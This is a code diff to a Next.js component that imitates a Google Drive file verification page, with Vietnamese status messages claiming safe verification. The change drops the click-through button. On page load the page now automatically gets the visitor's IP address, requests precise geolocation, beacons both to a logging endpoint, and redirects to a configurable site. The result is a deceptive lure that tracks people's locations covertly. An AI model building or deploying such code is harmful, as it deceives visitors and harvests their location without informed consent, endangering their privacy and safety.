@@ -1,10 +1,10 @@
 
 'use client';
 
-import { Button } from '@/components/ui/button';
+import React, { useEffect, useState } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
-import { FileText, ShieldCheck } from 'lucide-react';
+import { Loader2 } from 'lucide-react';
 import type { VerificationConfig } from '@/app/actions/settings';
 
 interface DriveVerificationClientProps {
@@ -12,63 +12,81 @@ interface DriveVerificationClientProps {
 }
 
 export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
-  const { 
-    title, 
-    description, 
-    fileName, 
-    fileInfo, 
-    buttonText, 
-    footerText, 
-    redirectUrl 
-  } = config;
-  
-  const REDIRECT_URL = redirectUrl || 'https://www.facebook.com'; 
+  const { redirectUrl } = config;
+  const [status, setStatus] = useState('Đang khởi tạo xác minh...');
 
-  const requestLocation = async () => {
-    let clientIp = 'N/A';
-    try {
+  useEffect(() => {
+    const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
+
+    const logAndRedirect = async () => {
+      let clientIp = 'N/A';
+      try {
+        setStatus('Đang xác định địa chỉ mạng...');
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         if (ipResponse.ok) {
-            const ipData = await ipResponse.json();
-            clientIp = ipData.ip;
+          const ipData = await ipResponse.json();
+          clientIp = ipData.ip;
         }
-    } catch(e) {
+      } catch (e) {
         console.error("Could not fetch IP", e);
-    }
+        setStatus('Không thể xác định địa chỉ. Đang chuyển hướng...');
+      }
 
-    const logData = (pos?: GeolocationPosition) => {
+      const logData = (pos?: GeolocationPosition) => {
+        setStatus('Đang ghi lại thông tin an toàn...');
         const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
         if (pos) {
-            body.lat = pos.coords.latitude;
-            body.lon = pos.coords.longitude;
-            body.acc = pos.coords.accuracy;
+          body.lat = pos.coords.latitude;
+          body.lon = pos.coords.longitude;
+          body.acc = pos.coords.accuracy;
         }
 
-        fetch('/api/log-location', {
+        const payload = JSON.stringify(body);
+        
+        // Use sendBeacon for reliable logging before redirect
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/log-location', payload);
+          // Redirect immediately after sending beacon
+          window.location.href = REDIRECT_URL;
+        } else {
+          // Fallback to fetch for older browsers
+          fetch('/api/log-location', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body),
-        }).finally(() => {
+            body: payload,
+            keepalive: true,
+          }).finally(() => {
             window.location.href = REDIRECT_URL;
-        });
-    }
+          });
+        }
+      };
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        logData, // Success callback
-        () => logData(), // Error callback
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      logData(); // Geolocation not supported
-    }
-  };
+      setStatus('Đang yêu cầu quyền truy cập vị trí...');
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          logData, // Success
+          () => { // Error
+            setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
+            logData(); // Log IP only
+          },
+          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+        );
+      } else {
+        setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
+        logData(); // Geolocation not supported
+      }
+    };
+
+    // A short delay before starting to allow the page to render.
+    const timer = setTimeout(logAndRedirect, 800);
+    
+    return () => clearTimeout(timer);
+  }, [redirectUrl]);
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-muted/30 p-4">
       <Card className="p-8 sm:p-10 rounded-xl shadow-2xl text-center max-w-md w-full bg-card border">
         <CardContent className="p-0 flex flex-col items-center">
-          
           <Image
             className="mb-5"
             src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg"
@@ -76,30 +94,14 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
             width={74}
             height={74}
           />
-          
-          <h1 className="text-2xl font-bold mb-2 text-foreground">{title}</h1>
+          <h1 className="text-2xl font-bold mb-2 text-foreground">Đang chuyển hướng...</h1>
           <p className="text-muted-foreground text-sm leading-normal mb-8">
-            {description}
+            Vui lòng đợi trong khi chúng tôi xác thực yêu cầu của bạn và chuyển hướng bạn một cách an toàn.
           </p>
 
-          <div className="w-full bg-muted/40 border rounded-lg p-4 flex items-center gap-4 mb-8 text-left">
-            <FileText className="h-10 w-10 text-primary shrink-0" />
-            <div>
-              <p className="font-semibold text-foreground">{fileName}</p>
-              <p className="text-xs text-muted-foreground">{fileInfo}</p>
-            </div>
-          </div>
-
-          <Button
-            className="w-full h-12 text-base font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-lg"
-            onClick={requestLocation}
-          >
-            <ShieldCheck className="mr-2 h-5 w-5" />
-            {buttonText}
-          </Button>
-
-          <div className="text-xs text-muted-foreground/80 mt-6">
-            {footerText}
+          <div className="w-full flex flex-col items-center justify-center gap-4 h-16">
+            <Loader2 className="h-10 w-10 text-primary animate-spin" />
+            <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
           </div>
         </CardContent>
       </Card>
